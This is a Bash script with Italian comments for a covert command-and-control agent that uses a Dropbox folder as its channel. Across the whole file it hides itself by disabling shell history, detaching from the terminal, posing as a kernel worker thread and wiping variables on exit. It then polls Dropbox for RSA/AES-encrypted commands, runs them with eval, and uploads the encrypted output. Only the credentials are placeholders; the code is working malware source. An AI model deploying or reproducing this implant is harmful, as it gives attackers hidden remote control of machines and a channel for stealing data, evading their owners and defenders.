#!/bin/bash

################################################################################

# SCRIPT: agent.sh (Drop-Dead Client) - FILELESS VERSION
# DESCRIZIONE: Agent C2 che esegue comandi cifrati da Dropbox

# VERSIONE: 2.3 Fileless Enhanced with Configurable Timing
# VERSIONE PRECEDENTE: Script base disponibile come agent_v1.sh

# [... TUTTO IL COMMENTO INIZIALE UGUALE ...]

################################################################################

# === MODALITÀ QUIET ===
QUIET_MODE=0
if [ "$1" = "-q" ] || [ "$2" = "-q" ] || [ "$3" = "-q" ]; then
    QUIET_MODE=1
fi

# === MODALITÀ DAEMON (DETACH) ===
DAEMON_MODE=0
if [ "$1" = "-d" ] || [ "$2" = "-d" ] || [ "$3" = "-d" ]; then
    DAEMON_MODE=1
fi

log() {
    [ $QUIET_MODE -eq 0 ] && echo "$@"
}

# === ANTI-FORENSIC MEASURES ===
# 1. Disabilita bash history
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# 2. Se daemon mode richiesto, detach completamente
if [ $DAEMON_MODE -eq 1 ] && [ "$1" != "--daemonized" ]; then
    log "[DAEMON]: Avvio modalità daemon (detach completo)..."
    
    # Costruisci argomenti
    DAEMON_ARGS="--daemonized --masked"
    [ $QUIET_MODE -eq 1 ] && DAEMON_ARGS="$DAEMON_ARGS -q"
    
    # Prova setsid (preferito), fallback nohup
    if command -v setsid >/dev/null 2>&1; then
        setsid bash "$0" $DAEMON_ARGS </dev/null >/dev/null 2>&1 &
        PID=$!
    else
        nohup bash "$0" $DAEMON_ARGS </dev/null >/dev/null 2>&1 &
        PID=$!
    fi
    
    disown 2>/dev/null || true
    echo "[DAEMON]: Agent avviato in background (PID: $PID)"
    exit 0
fi

# 3. Maschera processo come kernel worker thread
if [ "$1" != "--masked" ] && [ "$2" != "--masked" ] && [ "$1" != "--daemonized" ]; then
    MASK_ARGS="--masked"
    [ $QUIET_MODE -eq 1 ] && MASK_ARGS="$MASK_ARGS -q"
    exec -a "[kworker/u:0]" bash "$0" $MASK_ARGS
fi

# 4. Trap per cleanup automatico all'uscita
cleanup() {
    log "[CLEANUP]: Pulizia memoria in corso..." >&2
    
    unset APP_KEY APP_SECRET REFRESH_TOKEN ACCESS_TOKEN
    unset PUBLIC_KEY PK1 PK2 PK3 PK4
    unset aes_key aes_iv aes_key_out aes_iv_out
    unset command_to_run output encrypted_input encrypted_output
    unset encrypted_command encrypted_result encrypted_aes_key
    unset aes_credentials aes_credentials_out
    
    for i in {1..3}; do
        dummy=$(dd if=/dev/urandom bs=1M count=5 2>/dev/null | base64)
        unset dummy
    done
    
    log "[CLEANUP]: Memoria pulita" >&2
}

trap cleanup EXIT TERM

# === CONFIGURAZIONE OAUTH2 (offuscate base64) ===
APP_KEY=$(echo "PLACEHOLDER_APP_KEY_B64" | base64 -d)
APP_SECRET=$(echo "PLACEHOLDER_APP_SECRET_B64" | base64 -d)
REFRESH_TOKEN=$(echo "PLACEHOLDER_REFRESH_TOKEN_B64" | base64 -d)

# === CHIAVE RSA PUBBLICA (splittata e offuscata) ===
PK1="PLACEHOLDER_PK1"
PK2="PLACEHOLDER_PK2"
PK3="PLACEHOLDER_PK3"
PK4="PLACEHOLDER_PK4"

PUBLIC_KEY=$(echo "${PK1}${PK2}${PK3}${PK4}" | base64 -d)
unset PK1 PK2 PK3 PK4

# === CONFIGURAZIONE DROPBOX ===
FOLDER_PATH="/Machine1"
INPUT_FILE="/input.txt"
OUTPUT_FILE="/output.txt"
HEARTBEAT_FILE="/heartbeat.txt"

# === CONFIGURAZIONE SLEEP ===
BASE_SLEEP=PLACEHOLDER_BASE_SLEEP
JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT
JITTER=$((BASE_SLEEP * JITTER_PERCENT / 100))

log "[CONFIG]: Base sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"

# === VARIABILE ACCESS TOKEN (in-memory) ===
ACCESS_TOKEN=""

# === FUNZIONE REFRESH ACCESS TOKEN (fileless) ===
refresh_access_token() {
    log "[TOKEN]: Refresh access token..."
    
    response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
        -d refresh_token=$REFRESH_TOKEN \
        -d grant_type=refresh_token \
        -d client_id=$APP_KEY \
        -d client_secret=$APP_SECRET)
    
    new_token=$(echo "$response" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    
    if [ -n "$new_token" ]; then
        ACCESS_TOKEN="$new_token"
        log "[TOKEN]: [OK] Token aggiornato (in-memory)"
        return 0
    else
        log "[TOKEN]: [X] ERRORE refresh"
        return 1
    fi
}

# === GENERA TOKEN INIZIALE ===
refresh_access_token || exit 1

# === LOOP INFINITO ===
while true; do
    sleep_time=$(awk -v base=$BASE_SLEEP -v max=$JITTER 'BEGIN{srand(); jitter=rand()*max*2-max; printf "%.0f", base+jitter}')
    
    log ""
    log "========================================="
    log "=== AVVIO CICLO ==="
    log "========================================="
    
    # === HEARTBEAT UPDATE ===
    log "[HEARTBEAT]: Aggiornamento timestamp..."
    timestamp=$(date +%s)
    
    response=$(echo -n "$timestamp" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $ACCESS_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$HEARTBEAT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
    
    if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
        log "[HEARTBEAT]: [!] Token scaduto, refresh e retry..."
        refresh_access_token || exit 1
        
        response=$(echo -n "$timestamp" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
            --header "Authorization: Bearer $ACCESS_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$HEARTBEAT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    fi
    
    log "[HEARTBEAT]: [OK] Timestamp: $timestamp"
    
    # === DOWNLOAD COMANDO CIFRATO ===
    log ""
    log "[INPUT]: Download comando cifrato..."
    
    encrypted_input=$(curl -s -X POST https://content.dropboxapi.com/2/files/download \
        --header "Authorization: Bearer $ACCESS_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$INPUT_FILE\"}")
    
    if echo "$encrypted_input" | grep -q "expired_access_token\|invalid_access_token"; then
        log "[INPUT]: [!] Token scaduto, refresh e retry..."
        refresh_access_token || exit 1
        
        encrypted_input=$(curl -s -X POST https://content.dropboxapi.com/2/files/download \
            --header "Authorization: Bearer $ACCESS_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$INPUT_FILE\"}")
    fi
    
    if [ "$encrypted_input" = "MZ" ]; then
        log "[INPUT]: Nessun comando (MZ marker)"
        unset encrypted_input
        log "[SLEEP]: Attesa ${sleep_time}s"
        sleep "$sleep_time"
        log "=== FINE CICLO ==="
        continue
    fi
    
    # === DECIFRATURA COMANDO (IBRIDA RSA+AES) ===
    log "[INPUT]: Comando cifrato ricevuto: ${encrypted_input:0:50}..."
    log "[INPUT]: Decifratura ibrida (RSA+AES)..."
    
    encrypted_aes_key=$(echo "$encrypted_input" | cut -d':' -f1)
    encrypted_command=$(echo "$encrypted_input" | cut -d':' -f2-)
    
    if [ -z "$encrypted_aes_key" ] || [ -z "$encrypted_command" ]; then
        log "[INPUT]: [X] ERRORE formato input (separator ':' assente)"
        unset encrypted_input encrypted_aes_key encrypted_command
        sleep "$sleep_time"
        continue
    fi
    
    aes_credentials=$(echo "$encrypted_aes_key" | base64 -d 2>/dev/null | \
        openssl rsautl -verify -pubin -inkey <(echo "$PUBLIC_KEY") 2>/dev/null)
    
    if [ -z "$aes_credentials" ]; then
        log "[INPUT]: [X] ERRORE decifratura RSA (firma non valida o public key errata)"
        unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
        sleep "$sleep_time"
        continue
    fi
    
    if ! echo "$aes_credentials" | grep -qE '^[0-9a-f]{64}:[0-9a-f]{32}$'; then
        log "[INPUT]: [X] ERRORE formato AES credentials (atteso: 64hex:32hex)"
        unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
        sleep "$sleep_time"
        continue
    fi
    
    aes_key=$(echo "$aes_credentials" | cut -d':' -f1)
    aes_iv=$(echo "$aes_credentials" | cut -d':' -f2)
    
    command_to_run=$(echo "$encrypted_command" | base64 -d 2>/dev/null | \
        openssl enc -aes-256-cbc -d -K "$aes_key" -iv "$aes_iv" 2>/dev/null)
    
    unset encrypted_input encrypted_aes_key encrypted_command aes_credentials
    
    if [ -z "$command_to_run" ]; then
        log "[INPUT]: [X] ERRORE decifratura AES (chiave/IV errati o payload corrotto)"
        unset aes_key aes_iv command_to_run
        sleep "$sleep_time"
        continue
    fi
    
    log "[INPUT]: [OK] Comando decifrato: '$command_to_run'"
    
    # === CONTROLLA SE EXIT ===
    if [ "$command_to_run" = "EXIT" ]; then
        log "[INPUT]: Comando EXIT ricevuto"
        log "[AGENT]: Terminazione agent..."
        exit 0
    fi
    
    # === ESECUZIONE COMANDO ===
    log "[EXEC]: Esecuzione comando..."
    output=$(eval "$command_to_run" 2>&1)
    log "[EXEC]: Output (${#output} bytes):"
    [ $QUIET_MODE -eq 0 ] && echo "$output"
    
    unset command_to_run aes_key aes_iv
    
    # === CIFRATURA OUTPUT (IBRIDA RSA+AES) ===
    log ""
    log "[OUTPUT]: Cifratura output (ibrida RSA+AES)..."
    
    aes_key_out=$(openssl rand -hex 32)
    aes_iv_out=$(openssl rand -hex 16)
    
    if ! echo "$aes_key_out" | grep -qE '^[0-9a-f]{64}$' || \
       ! echo "$aes_iv_out" | grep -qE '^[0-9a-f]{32}$'; then
        log "[OUTPUT]: [X] ERRORE generazione chiavi AES"
        encrypted_result=$(echo -n "[ERROR_KEY_GENERATION]" | base64 -w 0)
        unset output aes_key_out aes_iv_out
    else
        encrypted_output=$(echo -n "$output" | \
            openssl enc -aes-256-cbc -K "$aes_key_out" -iv "$aes_iv_out" 2>/dev/null | base64 -w 0)
        
        aes_credentials_out="${aes_key_out}:${aes_iv_out}"
        encrypted_aes_out=$(echo -n "$aes_credentials_out" | \
            openssl rsautl -encrypt -pubin -inkey <(echo "$PUBLIC_KEY") 2>/dev/null | base64 -w 0)
        
        unset output
        
        if [ -n "$encrypted_output" ] && [ -n "$encrypted_aes_out" ]; then
            encrypted_result="${encrypted_aes_out}:${encrypted_output}"
            log "[OUTPUT]: [OK] Output cifrato (${#encrypted_result} bytes)"
        else
            log "[OUTPUT]: [X] ERRORE cifratura output"
            encrypted_result=$(echo -n "[ERROR_ENCRYPTION]" | base64 -w 0)
        fi
        
        unset aes_key_out aes_iv_out aes_credentials_out encrypted_aes_out encrypted_output
    fi
    
    # === UPLOAD OUTPUT CIFRATO ===
    log "[OUTPUT]: Upload output cifrato..."
    
    response=$(echo -n "$encrypted_result" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $ACCESS_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$OUTPUT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
    
    if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
        log "[OUTPUT]: [!] Token scaduto, refresh e retry..."
        refresh_access_token || exit 1
        
        response=$(echo -n "$encrypted_result" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
            --header "Authorization: Bearer $ACCESS_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$OUTPUT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    fi
    
    log "[OUTPUT]: [OK] File aggiornato"
    
    unset encrypted_result
    
    # === PULIZIA INPUT FILE ===
    log "[INPUT]: Pulizia file input..."
    
    response=$(echo -n "MZ" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
        --header "Authorization: Bearer $ACCESS_TOKEN" \
        --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$INPUT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
        --header "Content-Type: application/octet-stream" \
        --data-binary @-)
    
    if echo "$response" | grep -q "expired_access_token\|invalid_access_token"; then
        log "[INPUT]: [!] Token scaduto, refresh e retry..."
        refresh_access_token || exit 1
        
        response=$(echo -n "MZ" | curl -s -X POST https://content.dropboxapi.com/2/files/upload \
            --header "Authorization: Bearer $ACCESS_TOKEN" \
            --header "Dropbox-API-Arg: {\"path\":\"$FOLDER_PATH$INPUT_FILE\",\"mode\":\"overwrite\",\"autorename\":false}" \
            --header "Content-Type: application/octet-stream" \
            --data-binary @-)
    fi
    
    log "[INPUT]: [OK] File pulito (MZ)"
    
    # === SLEEP CON JITTER ===
    log ""
    log "[SLEEP]: Attesa ${sleep_time}s"
    sleep "$sleep_time"
    log "=== FINE CICLO ==="
done
